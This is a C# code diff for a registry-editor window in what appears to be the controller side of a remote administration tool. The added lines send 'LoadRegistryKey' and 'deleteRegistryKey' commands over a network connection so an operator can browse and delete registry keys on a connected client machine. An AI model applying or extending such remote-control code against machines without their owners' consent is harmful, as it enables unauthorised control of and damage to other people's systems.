@@ -7,6 +7,8 @@ using System.Windows.Forms;
 using Microsoft.Win32;
 using Server.Connection;
 using Server.Helper;
+using Server.MessagePack;
+using static Server.Helper.RegistrySeeker;
 
 namespace Server.Forms
 {
@@ -95,24 +97,12 @@ namespace Server.Forms
 
             // signal client to retrive the root nodes (indicated by null)
 
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+            msgpack.ForcePathObject("Command").AsString = "LoadRegistryKey";
+            msgpack.ForcePathObject("RootKeyName").AsString = "";
+            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
             //LoadRegistryKey(null);
-        }
-
-        private void FormRegistryEditor_FormClosed(object sender, FormClosedEventArgs e)
-        {
-            try
-            {
-                ThreadPool.QueueUserWorkItem((o) =>
-                {
-                    Client?.Disconnected();
-                });
-            }
-            catch { }
-        }
-
-        private void ShowErrorMessage(object sender, string errorMsg)
-        {
-            MessageBox.Show(errorMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
         }
 
         #region TreeView helper functions
@@ -143,7 +133,7 @@ namespace Server.Forms
             };
         }
 
-        private void AddKeys(object sender, string rootKey, RegSeekerMatch[] matches)
+        public void AddKeys(string rootKey, RegSeekerMatch[] matches)
         {
             if (string.IsNullOrEmpty(rootKey))
             {
@@ -611,6 +601,12 @@ namespace Server.Forms
             {
                 string parentPath = tvRegistryDirectory.SelectedNode.Parent.FullPath;
 
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                msgpack.ForcePathObject("Command").AsString = "deleteRegistryKey";
+                msgpack.ForcePathObject("KeyName").AsString = tvRegistryDirectory.SelectedNode.Name;
+                msgpack.ForcePathObject("ParentPath").AsString = parentPath;
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 //DeleteRegistryKey(parentPath, tvRegistryDirectory.SelectedNode.Name);
             }
         }
@@ -789,5 +785,14 @@ namespace Server.Forms
         }
 
         #endregion
+
+        public void timer1_Tick(object sender, EventArgs e)
+        {
+            try
+            {
+                if (!Client.TcpClient.Connected) this.Close();
+            }
+            catch { this.Close(); }
+        }
     }
 }
